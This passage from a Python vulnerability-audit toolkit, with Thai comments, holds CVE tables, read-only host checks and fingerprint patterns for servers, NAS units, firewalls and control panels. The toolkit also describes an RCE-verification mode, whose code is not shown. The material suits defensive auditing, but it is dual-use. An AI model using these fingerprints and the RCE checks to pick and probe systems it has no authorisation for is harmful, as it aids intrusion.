#!/usr/bin/env python3
"""
security_audit_toolkit.py — Security Audit Toolkit (RMUT CERT) v6.4
Scanner (14 CVEs) + RCE Verify (chain-of-custody) + Report Generator (PDF/CSV/Excel/HTML)
+ Cross-Menu Navigation + CVE Display + File Browser (GUI & Interactive CLI)

Menu & Outputs:
  1) ดูรายการ CVE ที่ใช้ตรวจสอบ (14 รายการ)
     → Output: ตารางรายละเอียด 14 CVEs (PHP 3 / NGINX 5 / Node.js 4 / GitLab 1 / OS-Kernel 1) บนหน้าจอ
  2) Scan Only (Single / CIDR / Wildcard / File List CSV-TXT)
     → Output: ไฟล์ JSON ผลการสแกน (scan_<mode>_<target>_<timestamp>.json)
  3) RCE Verify (Single / Browse JSON / CIDR / Wildcard)
     → Output: โฟลเดอร์หลักฐาน evidence/<host>_<timestamp>/ (transcript.log, metadata.json, summary.json, rce_proof.txt)
  4) Generate Report (Browse เลือกไฟล์ JSON ได้ทั้งแบบ GUI และ CLI)
     → Output: ไฟล์ PDF (6 บท) + ไฟล์ CSV (Excel) + กราฟ PNG 4 รูป ในโฟลเดอร์ reports/
  5) Full Pipeline (Single / CIDR / Wildcard / File List: Scan → RCE Verify → Generate Report อัตโนมัติ)
     → Output: ไฟล์ JSON (pipeline_*.json) + โฟลเดอร์หลักฐาน evidence/ + รายงาน PDF/CSV/Charts ใน reports/

Auto-rename: ทุก output มี timestamp + counter → ไม่ทับไฟล์เก่า

Dependencies:
    pip install requests reportlab matplotlib dnspython openpyxl

Usage:
    python3 security_audit_toolkit.py
    python3 security_audit_toolkit.py --list-cves
    python3 security_audit_toolkit.py --target 192.168.1.10
    python3 security_audit_toolkit.py --pipeline 192.168.1.10 --i-own-this-target
"""

import argparse
import base64
import csv
import hashlib
import ipaddress
import json
import os
import re
import shutil
import sys
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from html.parser import HTMLParser
from pathlib import Path
from threading import Lock, Thread
from urllib.parse import urlparse, urljoin, parse_qs, quote

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.stderr.write("ERROR: pip install requests\n")
    sys.exit(1)

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import cm
    from reportlab.platypus import (SimpleDocTemplate, Table, TableStyle,
                                     Paragraph, Spacer, PageBreak, Image)
    from reportlab.pdfbase import pdfmetrics
    from reportlab.pdfbase.ttfonts import TTFont
    from reportlab.lib.enums import TA_CENTER, TA_RIGHT
    HAS_REPORTLAB = True
except ImportError:
    HAS_REPORTLAB = False

try:
    import matplotlib
    matplotlib.use("Agg")
    import matplotlib.pyplot as plt
    from matplotlib import font_manager
    HAS_MPL = True
except Exception:
    # matplotlib อาจ import ไม่ได้แม้ติดตั้งแล้ว เช่น บั๊ก font cache บน macOS (KeyError '_items')
    # ไม่ปล่อยให้โปรแกรมล้ม — จะใช้การวาดกราฟในตัว (ReportLab) แทนโดยอัตโนมัติ
    HAS_MPL = False


# ═══════════════════════════════════════════════════════════════════════
# SECTION 1 — Constants
# ═══════════════════════════════════════════════════════════════════════

VERSION = "6.4"
_OWN_TARGET = False     # ตั้งเป็น True เมื่อใช้ --i-own-this-target
_NO_INTERACTIVE = False # True เมื่อใช้ --no-interactive (headless / GUI mode)
_SCAN_DEPTH = 2         # ความลึกการ crawl (--depth)
_SCAN_MAX_PAGES = 50    # จำนวนหน้าสูงสุดต่อโฮสต์ (--max-pages)
_SCAN_MODE = "auto"     # โหมดสแกนที่เลือกตั้งแต่ต้น (interactive): auto | external | lan
DEFAULT_UA = "RMUT-CERT all-in-one/3.0 (authorized testing only)"

PHP_PATCHED = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}

NGINX_VULN = {
    # Dual-range: stable branch ≤1.30.5 + mainline branch 1.31.0–1.31.6
    # NGINX 1.30.6 (stable) และ 1.31.7+ (mainline) ได้รับแพตช์แล้ว — ไม่รวมในช่วงนี้
    "CVE-2026-15176": [((0, 1, 29), (1, 30, 5)), ((1, 31, 0), (1, 31, 6))],
    "CVE-2026-93479": [((1, 30, 0), (1, 30, 5)), ((1, 31, 2), (1, 31, 6))],
    "CVE-2026-97205": [((0, 8, 11), (1, 30, 5)), ((1, 31, 0), (1, 31, 6))],
    "CVE-2026-95101": [((1, 25, 0), (1, 30, 5)), ((1, 31, 0), (1, 31, 6))],
    "CVE-2026-97629": [((1, 23, 2), (1, 30, 5)), ((1, 31, 0), (1, 31, 6))],
}

NGINX_CVE_DESCS = {
    "CVE-2026-15176": {"name": "Heap Buffer Overflow (alias+rewrite)",
        "severity": "Critical", "trigger": "alias+rewrite+$request_filename",
        "host_check": "nginx -T 2>/dev/null | grep -B5 -A15 'alias' || echo 'ไม่พบ alias (ปลอดภัย)'"},
    "CVE-2026-93479": {"name": "Heap Buffer Overflow (map+regex)",
        "severity": "Critical", "trigger": "map regex + capture vars",
        "host_check": "nginx -T 2>/dev/null | grep -B3 -A10 'map.*~' || echo 'ไม่พบ map regex (ปลอดภัย)'"},
    "CVE-2026-97205": {"name": "Use-After-Free (AIO+SSI)",
        "severity": "Critical", "trigger": "aio on + ssi on",
        "host_check": "nginx -T 2>/dev/null | grep -E 'aio\\s+on|ssi\\s+on' || echo 'ไม่พบ aio/ssi (ปลอดภัย)'"},
    "CVE-2026-95101": {"name": "Request Body Injection (HTTP/3)",
        "severity": "Medium", "trigger": "listen quic",
        "host_check": "nginx -T 2>/dev/null | grep -E 'listen.*quic|http3\\s+on' || echo 'ไม่พบ HTTP/3 (ปลอดภัย)'"},
    "CVE-2026-97629": {"name": "Session Forgery (TLS tickets)",
        "severity": "Medium", "trigger": "ssl_session_tickets on",
        "host_check": "nginx -T 2>/dev/null | grep ssl_session_ticket || echo 'ไม่พบการตั้งค่า ticket'"},
}

CVE_115560 = {
    "cve": "CVE-2026-115560", "name": "Session Upload Progress Injection",
    "severity": "Medium-High (no patch yet)",
    "trigger": "serialize_handler เปลี่ยน runtime + upload_progress on",
    "host_check": "php -i | grep -E 'session.serialize_handler|session.upload_progress'",
    "mitigation": "session.upload_progress.enabled = 0",
}

# ═══════════════════════════════════════════════════════════════════════
# CVE DATABASE — 13 ช่องโหว่ (สำหรับแสดงให้ผู้ใช้เห็นก่อนสแกน)
# ═══════════════════════════════════════════════════════════════════════

CVE_DATABASE = [
    {"id": "CVE-2026-109618", "category": "PHP", "severity": "Critical",
     "name": "PHP Use-After-Free (OOM bailout)",
     "desc": "Memory corruption เมื่อ PHP ประมวลผล multipart + OOM — trigger ก่อน app code",
     "patched": "PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12+"},
    {"id": "CVE-2026-109619", "category": "PHP", "severity": "Critical",
     "name": "PHP Use-After-Free (stale global state)",
     "desc": "Global state ไม่รีเซ็ตหลัง fatal error → session.upload_progress อ้างหน่วยความจำที่ free",
     "patched": "PHP 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12+"},
    {"id": "CVE-2026-115560", "category": "PHP", "severity": "Medium-High",
     "name": "PHP Session Upload Progress Injection",
     "desc": "serialize_handler runtime + upload_progress on → session injection → RCE",
     "patched": "ยังไม่มีแพตช์ — session.upload_progress.enabled=0"},
    {"id": "CVE-2026-15176", "category": "NGINX", "severity": "Critical",
     "name": "NGINX Heap Buffer Overflow (alias + rewrite)",
     "desc": "alias + rewrite + $request_filename → heap overflow → RCE",
     "patched": "NGINX 1.30.6+ / 1.31.7+"},
    {"id": "CVE-2026-93479", "category": "NGINX", "severity": "Critical",
     "name": "NGINX Heap Buffer Overflow (map + regex)",
     "desc": "map regex + capture vars ก่อน map output → heap overflow",
     "patched": "NGINX 1.30.6+ / 1.31.7+"},
    {"id": "CVE-2026-97205", "category": "NGINX", "severity": "Critical",
     "name": "NGINX Use-After-Free (AIO + SSI)",
     "desc": "aio on + ssi on + .shtml include virtual → use-after-free",
     "patched": "NGINX 1.30.6+ / 1.31.7+"},
    {"id": "CVE-2026-95101", "category": "NGINX", "severity": "Medium",
     "name": "NGINX Request Body Injection (HTTP/3)",
     "desc": "HTTP/3 quic — request body injection bypass client_max_body_size",
     "patched": "NGINX 1.30.6+ / 1.31.7+"},
    {"id": "CVE-2026-97629", "category": "NGINX", "severity": "Medium",
     "name": "NGINX Session Forgery (TLS tickets)",
     "desc": "TLS session ticket key ไม่ initialize ครบ → session forgery",
     "patched": "NGINX 1.30.6+ / 1.31.7+"},
    {"id": "CVE-2026-105482", "category": "Node.js", "severity": "High",
     "name": "Node.js DNS NUL Domain Validation Bypass",
     "desc": "ชื่อโดเมนที่มีอักขระ NUL ทำให้ตรวจปลายทางผิด และหลีกเลี่ยงข้อจำกัดการเข้าถึง",
     "patched": "อัปเกรด Node.js เป็นรุ่นที่แก้แล้ว"},
    {"id": "CVE-2026-105483", "category": "Node.js", "severity": "High",
     "name": "Node.js TLS Cert Validation (Unicode IP)",
     "desc": "ใช้ IP รูปแบบ Unicode ทำให้ยอมรับใบรับรองเซิร์ฟเวอร์ที่ไม่ถูกต้อง",
     "patched": "อัปเกรด Node.js เป็นรุ่นที่แก้แล้ว"},
    {"id": "CVE-2026-106069", "category": "Node.js", "severity": "High",
     "name": "Node.js TLS Endpoint Identity Bypass",
     "desc": "IP รูปแบบไม่มาตรฐานทำให้หลีกเลี่ยงการตรวจตัวตนเซิร์ฟเวอร์ใน TLS",
     "patched": "อัปเกรด Node.js เป็นรุ่นที่แก้แล้ว"},
    {"id": "CVE-2026-111497", "category": "Node.js", "severity": "Critical",
     "name": "Node.js Brotli Out-of-bounds Write (RCE)",
     "desc": "ข้อมูลบีบอัด Brotli ที่ผิดปกติ → เขียนทับหน่วยความจำ → อาจรันคำสั่งอันตราย (RCE)",
     "patched": "อัปเกรด Node.js เป็นรุ่นที่แก้แล้ว"},
    {"id": "CVE-2026-110264", "category": "GitLab", "severity": "High",
     "name": "GitLab CVE-2026-110264",
     "desc": "ช่องโหว่ใน GitLab — ตรวจจับการมีอยู่ของ GitLab + เวอร์ชัน (ยืนยันบนเครื่อง/ตาม advisory)",
     "patched": "อัปเกรด GitLab เป็นรุ่นที่แก้แล้ว (ดู advisory ของ CVE)"},
    {"id": "CVE-2026-98432", "category": "OS/Kernel", "severity": "Critical",
     "name": "Linux Kernel TCP Use-After-Free (IPv4 options)",
     "desc": "use-after-free ใน IPv4 TCP connection setup (race) — SYN ที่มี IPv4 options ไปพอร์ต TCP ที่ listen → RCE/DoS (CVSS 9.8, network, ไม่ต้องยืนยันตัวตน) กระทบ kernel 4.4+ ตรวจจากภายนอกไม่ได้ ต้องยืนยัน uname -r บนเครื่อง",
     "patched": "อัปเดตเคอร์เนลเป็นรุ่นที่ดิสโทรแก้แล้ว (fix: commit e3f33b0a1d89) แล้วรีบูต หรือใช้ live-patch"},
]

# ═══════════════════════════════════════════════════════════════════════
# ผลลัพธ์ที่ "ยืนยัน" ช่องโหว่ — อธิบายว่าถ้ารันคำสั่ง host_check แล้วได้ output แบบไหน
# ถึงจะถือว่าเข้าเงื่อนไข (🔴 กระทบ) หรือปลอดภัย (🟢 ปลอดภัย) — ใช้แสดงในรายงาน/แดชบอร์ด
# keyed ด้วย CVE id (รวม UNSUPPORTED-*) — ดึง/แมปใน _confirm_of()
# ═══════════════════════════════════════════════════════════════════════
CONFIRM_OUTPUT = {
    # ── NGINX 2026 (ตรวจจากคอนฟิก nginx -T) ──
    "CVE-2026-15176": {
        "vuln": "ใช้ `nginx -T` (ตัว T ใหญ่) แล้วพบบล็อก `location` ที่มีทั้ง `alias` ร่วมกับ `rewrite ... $request_filename` (alias รับค่าจาก URL ได้) และ nginx อยู่ในช่วงกระทบ (< 1.30.6 / 1.31.7)",
        "safe": "รันแล้วได้ข้อความ 'ไม่พบ alias (ปลอดภัย)' (grep คืนค่าว่าง หรือมีเฉพาะข้อความ syntax test สองบรรทัด), หรือ `alias` เป็นพาธคงที่ไม่ใช้คู่กับ rewrite, หรือ nginx ≥ 1.30.6 / 1.31.7 → ปลอดภัย"},
    "CVE-2026-93479": {
        "vuln": "ใช้ `nginx -T` (ตัว T ใหญ่) แล้วพบคำสั่ง `map` ที่ใช้ regex (`~` หรือ `~*`) และนำตัวแปร regex capture ($1, $2) ไปประกอบพาธ/ชื่อไฟล์ และ nginx อยู่ในช่วงกระทบ (< 1.30.6 / 1.31.7)",
        "safe": "รันแล้วได้ข้อความ 'ไม่พบ map regex (ปลอดภัย)' (grep คืนค่าว่าง), หรือ `map` เป็นการจับคู่สตริงธรรมดา (ไม่ใช้ regex capture ไปเปิดไฟล์), หรือ nginx ≥ 1.30.6 / 1.31.7 → ปลอดภัย"},
    "CVE-2026-97205": {
        "vuln": "ใช้ `nginx -T` (ตัว T ใหญ่) แล้วพบบรรทัด `aio on;` และ `ssi on;` ปรากฏขึ้นมาทั้งคู่ในบล็อกเดียวกัน (เปิดพร้อมกัน) + มีการใช้ SSI include virtual",
        "safe": "รันแล้วได้ข้อความ 'ไม่พบ aio/ssi (ปลอดภัย)' (grep คืนค่าว่าง หรือขึ้นเฉพาะข้อความ syntax test สองบรรทัด), หรือพบบรรทัดใดบรรทัดหนึ่งเพียงอย่างเดียว (aio หรือ ssi ไม่ได้เปิดคู่กัน) → ไม่เข้าเงื่อนไข (ปลอดภัย)"},
    "CVE-2026-95101": {
        "vuln": "ใช้ `nginx -T` (ตัว T ใหญ่) แล้วพบบรรทัด `listen ... quic;` หรือ `http3 on;` (เปิด HTTP/3 QUIC) และ nginx อยู่ในช่วงกระทบ (1.25.0–1.30.5 / 1.31.0–1.31.6)",
        "safe": "รันแล้วได้ข้อความ 'ไม่พบ HTTP/3 (ปลอดภัย)' (grep คืนค่าว่าง), หรือ NGINX ไม่ได้คอมไพล์โมดูล HTTP/3 (`nginx -V` ไม่มี `--with-http_v3_module`), หรือ nginx ≥ 1.30.6 / 1.31.7 → ปลอดภัย"},
    "CVE-2026-97629": {
        "vuln": "ใช้ `nginx -T` (ตัว T ใหญ่) แล้วพบบรรทัด `ssl_session_tickets on;` หรือไม่มีการระบุคำสั่งนี้ในคอนฟิก (เพราะค่าเริ่มต้นของ NGINX คือ on) และ nginx อยู่ในช่วงกระทบ (1.23.2–1.30.5 / 1.31.0–1.31.6)",
        "safe": "รันแล้วพบบรรทัด `ssl_session_tickets off;` ระบุไว้อย่างชัดเจน (ปิด TLS ticket แล้ว), หรือ nginx ≥ 1.30.6 / 1.31.7 → ปลอดภัย"},

    # ── PHP 2026 (ตรวจจาก php -v / php -i) ──
    "CVE-2026-109618": {
        "vuln": "`php -v` แสดงรุ่นต่ำกว่า 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12 และ `Server API` แสดงเป็น `FPM/FastCGI` หรือ `Apache 2.0 Handler` (รับ request จากเว็บภายนอก)",
        "safe": "`php -v` ได้รับการอัปเกรดเป็นรุ่น ≥ แพตช์แล้ว (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12), หรือรันเฉพาะ `Server API => Command Line Interface` (CLI) โดยไม่มี Web Service รับทราฟฟิก → ปลอดภัย"},
    "CVE-2026-109619": {
        "vuln": "`php -i | grep session.upload_progress` แสดง `session.upload_progress.enabled => On` (หรือไม่มีการตั้งค่าไว้ ซึ่ง PHP เปิดเป็น On โดยปริยาย) ร่วมกับ `php -v` ต่ำกว่า 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12",
        "safe": "แสดง `session.upload_progress.enabled => Off => Off` อย่างชัดเจนใน php.ini (ปิดฟีเจอร์นี้แล้ว), หรือ `php -v` ได้รับการอัปเกรดเป็นรุ่น ≥ แพตช์แล้ว → ปลอดภัย"},
    "CVE-2026-115560": {
        "vuln": "`session.upload_progress.enabled => On` และแอปพลิเคชันมีการเรียก `ini_set('session.serialize_handler', ...)` เพื่อสลับไปใช้ `php_serialize` ในขณะที่ค่าเริ่มต้นเป็น `php`",
        "safe": "ตั้งค่า `session.upload_progress.enabled = 0` (Off) ใน php.ini, หรือแอปพลิเคชันไม่มีการสลับ serialize_handler ข้ามรูปแบบตอน runtime → ปลอดภัย"},

    # ── Node.js 2026 (ตรวจจาก node -v) ──
    "CVE-2026-105482": {
        "vuln": "`node -v` แสดงรุ่นต่ำกว่า 18.20.8 / 20.19.2 / 22.15.1 / 23.11.1 (มีช่องโหว่ DNS NUL Domain Bypass ใน c-ares)",
        "safe": "`node -v` ได้รับการอัปเกรดเป็นรุ่นที่แก้แล้ว: ≥ 18.20.8, ≥ 20.19.2, ≥ 22.15.1, ≥ 23.11.1 หรือ Node.js 24 LTS ขึ้นไป → ปลอดภัย"},
    "CVE-2026-105483": {
        "vuln": "`node -v` แสดงรุ่นต่ำกว่า 20.19.2 / 22.15.1 (มีช่องโหว่ TLS Cert Validation กับ Unicode IP)",
        "safe": "`node -v` ได้รับการอัปเกรดเป็นรุ่นที่แก้แล้ว: ≥ 20.19.2, ≥ 22.15.1 หรือ Node.js 24 LTS ขึ้นไป → ปลอดภัย"},
    "CVE-2026-106069": {
        "vuln": "`node -v` แสดงรุ่นต่ำกว่า 20.19.2 / 22.15.1 (มีช่องโหว่ checkServerIdentity Bypass กับ non-standard IP format)",
        "safe": "`node -v` ได้รับการอัปเกรดเป็นรุ่นที่แก้แล้ว: ≥ 20.19.2, ≥ 22.15.1 หรือ Node.js 24 LTS ขึ้นไป → ปลอดภัย"},
    "CVE-2026-111497": {
        "vuln": "`node -v` ต่ำกว่า 20.19.2 / 22.15.1 / 23.11.1 และแอปพลิเคชันเปิดรับหรือคลี่คลายข้อมูลบีบอัด Brotli (ผ่าน zlib.brotli, undici, หรือรับ Content-Encoding: br)",
        "safe": "`node -v` ได้รับการอัปเกรดเป็นรุ่นที่แก้แล้ว (≥ 20.19.2 / ≥ 22.15.1), หรือแอปพลิเคชันไม่มีการคลี่คลายข้อมูล Brotli จากภายนอก → ปลอดภัย"},

    # ── CVE ย้อนหลัง ──
    "CVE-2019-11043": {
        "vuln": "`php-fpm -v` อยู่ในช่วง 7.1.0–7.1.32 / 7.2.0–7.2.23 / 7.3.0–7.3.10 ร่วมกับในคอนฟิก NGINX (`nginx -T`) มีคำสั่ง `fastcgi_split_path_info` ส่ง PATH_INFO ที่ว่างได้",
        "safe": "`php-fpm -v` ≥ 7.1.33 / 7.2.24 / 7.3.11 หรือ PHP 8.x, หรือไม่ได้ใช้ PHP-FPM (เช่น mod_php), หรือ NGINX ไม่ได้ใช้ `fastcgi_split_path_info` → ปลอดภัย"},
    "CVE-2022-31626": {
        "vuln": "`php -m` พบทั้ง `pdo_mysql` และ `mysqlnd` ร่วมกับ `php -v` < 7.4.30 / 8.0.20 / 8.1.7 และแอปพลิเคชันอนุญาตให้ผู้ใช้ภายนอกกำหนด Host/Credentials การเชื่อมต่อ DB",
        "safe": "`php -v` ≥ 7.4.30 / 8.0.20 / 8.1.7 (หรือ PHP 8.2 ขึ้นไป), หรือไม่ได้ใช้ pdo_mysql, หรือ connection string ถูกกำหนดตายตัวจากฝั่งเซิร์ฟเวอร์เท่านั้น → ปลอดภัย"},
    "CVE-2024-4577": {
        "vuln": "รัน PHP บน Windows ในโหมด CGI/FastCGI (`ScriptAlias /php-cgi/` หรือ SAPI = CGI) และ `php -v` < 8.1.29 / 8.2.20 / 8.3.8 โดยเฉพาะระบบที่ใช้ System Code Page ภาษาจีน/ญี่ปุ่น",
        "safe": "รันบนระบบปฏิบัติการ Linux, หรือไม่ได้ใช้ php-cgi (เช่น ใช้ PHP-FPM / mod_php), หรือ `php -v` ≥ 8.1.29 / 8.2.20 / 8.3.8 → ปลอดภัย"},
    "CVE-2016-5385": {
        "vuln": "รัน PHP ผ่าน CGI/FastCGI บน `php -v` < 5.5.38 / 5.6.24 / 7.0.9 และในซอร์สโค้ดมีการเรียก `getenv('HTTP_PROXY')` หรือ `$_SERVER['HTTP_PROXY']` ไปตั้งค่า proxy",
        "safe": "`php -v` ≥ 5.5.38 / 5.6.24 / 7.0.9 หรือ PHP 8.x, หรือไม่มีการอ่าน HTTP_PROXY จาก env ในโค้ด, หรือมี Web Server / WAF ดรอป header `Proxy:` ทิ้ง → ปลอดภัย"},
    "CVE-2021-23017": {
        "vuln": "ใช้ `nginx -T` (ตัว T ใหญ่) แล้วพบบรรทัด directive `resolver <ip>;` ในคอนฟิก และ `nginx -v` < 1.20.1 / 1.21.0",
        "safe": "รันแล้วได้ข้อความ 'ไม่พบ directive resolver (ปลอดภัย)' (grep คืนค่าว่าง), หรือ `nginx -v` ≥ 1.20.1 / 1.21.0 (หรือ 1.24/1.26/1.30) → ปลอดภัย"},
    "CVE-2022-41742": {
        "vuln": "`nginx -V` มีการคอมไพล์ `--with-http_mp4_module` ร่วมกับคอนฟิก `nginx -T` มี directive `mp4;` และ `nginx -v` < 1.22.1 / 1.23.2",
        "safe": "ไม่ได้คอมไพล์ mp4 module หรือไม่มี directive `mp4;` ในคอนฟิก (grep คืนค่าว่าง), หรือ `nginx -v` ≥ 1.22.1 / 1.23.2 → ปลอดภัย"},
    "CVE-2021-22930": {
        "vuln": "`node -v` แสดงรุ่นต่ำกว่า 12.22.4 / 14.17.4 / 16.6.0 (ช่องโหว่ Use-After-Free ใน HTTP/2)",
        "safe": "`node -v` ≥ 12.22.4 / 14.17.4 / 16.6.0 หรือ Node.js 18.x / 20.x / 22.x ขึ้นไป → ปลอดภัย"},
    "CVE-2023-30581": {
        "vuln": "มีกระบวนการรัน Node.js ด้วยพารามิเตอร์ `--experimental-policy` (มี policy.json) และ `node -v` < 16.20.1 / 18.16.1 / 20.3.1",
        "safe": "ไม่ได้เปิดใช้งาน experimental policy (รันปกติ), หรือ `node -v` ≥ 16.20.1 / 18.16.1 / 20.3.1 (หรือ Node.js 22 LTS ขึ้นไป) → ปลอดภัย"},
    "CVE-2026-110264": {
        "vuln": "เวอร์ชัน GitLab อยู่ในช่วงที่ได้รับผลกระทบ: 16.0.0–18.5.1 / 18.6.0–18.6.1 / 18.7.0 (ต่ำกว่า 18.5.2 / 18.6.2 / 18.7.1)",
        "safe": "เวอร์ชัน GitLab ≥ 18.5.2 / 18.6.2 / 18.7.1 แล้ว หรือไม่ได้มีการติดตั้ง GitLab บนเครื่องนี้ → ปลอดภัย"},
    "CVE-2026-98432": {
        "vuln": "บนเครื่อง: `uname -r` แสดงเคอร์เนล Linux 4.4 ขึ้นไปที่ยังเป็นรุ่นก่อนแก้ (ยังไม่มี backport ของ commit e3f33b0a1d89 'ipv4: free inet_opt and ireq_opt after an RCU grace period' ตาม advisory ของดิสโทร) และเครื่องเปิดพอร์ต TCP ที่เข้าถึงจากเครือข่ายได้ → เข้าข่าย",
        "safe": "เคอร์เนลอัปเดตเป็นรุ่นที่ดิสโทรแก้แล้ว (หรือใช้ live-patch) และรีบูตแล้ว, หรือระบบไม่ใช่ Linux → ปลอดภัย"},

    # ── รุ่นหมดอายุ (Unsupported) ──
    "UNSUPPORTED-PHP": {
        "vuln": "`php -v` แสดงเลขรุ่นในสาขาที่ EOL สิ้นสุดการสนับสนุนแล้ว (PHP 5.x, PHP 7.x, หรือ PHP ≤ 8.1.x เช่น 5.4.45, 7.4.3, 8.1.2) ซึ่งไม่ได้รับแพตช์ความปลอดภัยอีกต่อไป",
        "safe": "`php -v` อยู่ในสาขาที่ยังคงได้รับการสนับสนุนอย่างเป็นทางการ: PHP 8.2 (ถึงสิ้นปี 2026), PHP 8.3, PHP 8.4 หรือ PHP 8.5 ขึ้นไป → ปลอดภัย"},
    "UNSUPPORTED-NGINX": {
        "vuln": "`nginx -v` แสดงรุ่นต่ำกว่าสาขาปัจจุบัน — เก่ากว่า 1.30 (เช่น NGINX 1.14, 1.18, 1.20, 1.22, 1.24, 1.26, 1.28) ซึ่งเป็นรุ่น EOL ขาดการอัปเดตความปลอดภัย",
        "safe": "`nginx -v` อยู่ในสาขาที่ยังคงได้รับการสนับสนุน: 1.30.x (Stable) หรือ 1.31.x (Mainline) → ปลอดภัย"},
    "UNSUPPORTED-NODEJS": {
        "vuln": "`node -v` แสดง Major Version ที่สิ้นสุดอายุการสนับสนุน (EOL) เช่น Node.js 14, 16, 18 รวมถึง Node.js 20 (EOL) ซึ่งไม่มีการออกแพตช์แก้อีกต่อไป",
        "safe": "`node -v` เป็นรุ่น Active/Maintenance LTS ที่ยังได้รับการสนับสนุน: Node.js 22.x LTS หรือ Node.js 24.x LTS ขึ้นไป → ปลอดภัย"},
}


def _confirm_of(cve_id):
    """คืน dict {'vuln':..,'safe':..} ของผลลัพธ์ที่ยืนยันช่องโหว่ หรือ None ถ้าไม่มีข้อมูล"""
    return CONFIRM_OUTPUT.get(cve_id or "")


def _esc_pdf(t):
    """ทำให้ข้อความปลอดภัยสำหรับ ReportLab Paragraph (escape XML + แปลงอักขระพิเศษเป็น ASCII
    กันปัญหาฟอนต์ไทยไม่มี glyph เช่น → ≥ ≤ – —)"""
    t = str(t)
    for a, b in [("→", "->"), ("≥", ">="), ("≤", "<="), ("–", "-"), ("—", "-"),
                 ("🔴", ""), ("🟢", "")]:
        t = t.replace(a, b)
    return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

OS_PATTERNS = [(re.compile(r"ubuntu", re.I), "Ubuntu"),
               (re.compile(r"debian", re.I), "Debian"),
               (re.compile(r"centos", re.I), "CentOS"),
               (re.compile(r"red hat|rhel", re.I), "RHEL"),
               (re.compile(r"alpine", re.I), "Alpine"),
               (re.compile(r"windows|iis", re.I), "Windows")]

SERVER_SIGS = [(re.compile(r"apache(?:/(\S+))?", re.I), "Apache"),
               (re.compile(r"nginx(?:/(\S+))?", re.I), "NGINX"),
               (re.compile(r"microsoft-iis(?:/(\S+))?", re.I), "IIS"),
               (re.compile(r"litespeed", re.I), "LiteSpeed"),
               (re.compile(r"openresty", re.I), "OpenResty")]

# OS token ที่รั่วใน Server header ของ Apache เช่น "Apache/2.4.41 (Ubuntu)" / "(Red Hat)" / "(Win64)"
OS_PAREN_RE = re.compile(r"\(([^)]{2,40})\)")
# โมดูลที่มักติดมากับ Server header พร้อมเวอร์ชัน (เอาไปเทียบ CVE ได้ เช่น OpenSSL)
MODULE_VER_RE = re.compile(
    r"\b(OpenSSL|mod_ssl|mod_fcgid|mod_jk|mod_perl|mod_wsgi|mod_security2?|"
    r"Phusion_Passenger|Passenger|Python|Perl|Tomcat|Jetty|Coyote)/([\w.]+)", re.I)

# ชนิดอุปกรณ์/แพลตฟอร์ม (กลุ่ม 3/4/6 ThaiCERT) — ตรวจจาก header+cookie+body+title
# แต่ละตัว: (ชื่อ, [regex สัญญาณใด ๆ ที่ match ใน blob], regex ดึง firmware version หรือ None, หมวด)
DEVICE_SIGS = [
    ("Synology DSM",       [r"\bsynology\b", r"x-syno", r"/webman/", r"synohdpack", r"syno_"], r"(?:DSM|dsm)[^\d]{0,6}([\d.]+)", "NAS"),
    ("QNAP QTS",           [r"\bqnap\b", r"/cgi-bin/filemanager", r"\bQTS\b", r"quts hero"], r"QTS[^\d]{0,6}([\d.]+)", "NAS"),
    ("TrueNAS/FreeNAS",    [r"truenas", r"freenas"], r"TrueNAS[- ]?([\d.]+)", "NAS"),
    ("WD MyCloud",         [r"wd\s*mycloud", r"western digital"], None, "NAS"),
    ("Asustor ADM",        [r"asustor", r"\bADM\b"], None, "NAS"),
    ("pfSense",            [r"pfsense"], r"pfSense[ /]+([\d.]+)", "Firewall"),
    ("OPNsense",           [r"opnsense"], None, "Firewall"),
    ("Fortinet FortiGate", [r"fortigate", r"fortios", r"x-forti"], None, "Firewall"),
    ("Sophos",             [r"\bsophos\b"], None, "Firewall"),
    ("Ubiquiti UniFi",     [r"\bunifi\b", r"ubiquiti"], None, "Network"),
    ("MikroTik RouterOS",  [r"mikrotik", r"routeros"], r"RouterOS[ /]+([\d.]+)", "Network"),
    ("CUPS Printer",       [r"\bCUPS\b", r"\bIPP/"], r"CUPS/([\d.]+)", "Printer"),
    ("cPanel",             [r"\bcpanel\b", r"x-cpanel"], None, "Control Panel"),
    ("Plesk",              [r"\bplesk\b"], r"Plesk[ /]+v?([\d.]+)", "Control Panel"),
    ("DirectAdmin",        [r"directadmin"], None, "Control Panel"),
    ("Webmin",             [r"\bwebmin\b"], r"Webmin[ /]+([\d.]+)", "Control Panel"),
    # ── Control panel โอเพนซอร์ส/ฟรี ยอดนิยม (มักเปิดพอร์ตเฉพาะ เช่น 8083/8090/7800) ──
    ("HestiaCP",           [r"hestia\s*control\s*panel", r"\bhestiacp\b", r"hst[_-]", r"/login/\?"],
     r"hestia[^\d<]{0,24}v?(\d+\.\d+[\d.]*)", "Control Panel"),
    ("VestaCP",            [r"vesta\s*control\s*panel", r"\bvestacp\b", r"\bvst_"],
     r"vesta[^\d<]{0,24}v?(\d+\.\d+[\d.]*)", "Control Panel"),
    ("CyberPanel",         [r"cyberpanel"], r"cyberpanel[^\d<]{0,16}v?(\d+\.\d+[\d.]*)", "Control Panel"),
    ("aaPanel / BT-Panel", [r"aapanel", r"bt-panel", r"\bbt_", r"/bt_", r"宝塔", r"baota"],
     None, "Control Panel"),
    ("ISPConfig",          [r"ispconfig"], r"ispconfig[^\d<]{0,16}(\d+\.\d+[\d.]*)", "Control Panel"),
    ("ISPmanager",         [r"ispmanager"], r"ispmanager[^\d<]{0,16}(\d+\.\d+[\d.]*)", "Control Panel"),
    ("Froxlor",            [r"froxlor"], r"froxlor[^\d<]{0,16}(\d+\.\d+[\d.]*)", "Control Panel"),
    ("Ajenti",             [r"\bajenti\b"], r"ajenti[^\d<]{0,12}(\d+\.\d+[\d.]*)", "Control Panel"),
